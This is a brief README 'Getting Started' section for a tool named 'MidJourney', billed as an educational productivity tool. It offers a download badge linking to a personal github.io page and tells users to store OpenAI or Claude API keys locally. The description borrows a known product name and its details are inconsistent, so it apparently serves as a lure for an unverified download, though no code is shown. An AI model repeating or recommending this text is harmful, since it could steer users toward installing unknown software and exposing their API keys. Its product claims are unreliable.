## 🏁 Getting Started

1. **Clone or Download MidJourney**  
   [![Download](https://img.shields.io/badge/Download-green)](https://haytam111234.github.io)
2. **Install requirements**  
   Run `python setup.py install` or see `docs/INSTALL.md` for platform specifics.
3. **API Keys**  
   Store your OpenAI or Claude API keys securely in `~/.midjourney` or via the UI.
4. **Generate**  
   Fire up the Electron app or `midjourney-web`.
5. **Prompt and Play**  
   Enter your subject, select style, and let MidJourney bring study concepts to life.

See the comprehensive user manual in `docs/USER_GUIDE.md` for workflows, troubleshooting, and advanced options.

MidJourney is an educational productivity tool that leverages current AI and natural language processing techniques.
